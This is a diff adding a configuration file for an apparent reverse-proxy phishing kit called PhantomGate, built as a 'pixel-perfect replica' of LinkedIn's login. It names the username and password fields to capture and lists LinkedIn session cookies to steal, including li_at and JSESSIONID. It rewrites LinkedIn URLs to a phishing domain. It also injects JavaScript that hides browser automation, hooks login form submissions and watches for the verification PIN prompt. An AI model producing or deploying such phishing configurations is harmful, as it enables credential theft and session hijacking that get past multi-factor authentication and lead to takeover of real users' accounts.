@@ -1,0 +1,88 @@
+name: LinkedIn
+author: PhantomGate
+version: 2.0.0
+description: LinkedIn authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - www.linkedin.com
+    - linkedin.com
+    - login.linkedin.com
+  
+  login:
+    domain: www.linkedin.com
+    path: /login
+    username:
+      selector: "input#session_key"
+      capture: true
+    password:
+      selector: "input#session_password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: li_at
+        regex: ".*"
+      - name: JSESSIONID
+        regex: ".*"
+      - name: bcookie
+        regex: ".*"
+      - name: bscookie
+        regex: ".*"
+      - name: lidc
+        regex: ".*"
+      - name: UserMatchHistory
+        regex: ".*"
+      - name: AnalyticsHistory
+        regex: ".*"
+      - name: BizCompleteHistory
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: www.linkedin.com
+      inject: true
+    - domain: linkedin.com
+      inject: true
+  
+  sub_filters:
+    - domain: www.linkedin.com
+      search: "https://www.linkedin.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - LinkedIn
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#session_key');
+        var password = form.querySelector('#session_password');
+        if (username && password) {
+          console.log('[PhantomGate] LinkedIn credentials captured');
+        }
+      }, true);
+      
+      // Monitor for verification prompt
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var pin = node.querySelector('input[name="pin"]');
+              if (pin) {
+                console.log('[PhantomGate] Verification prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
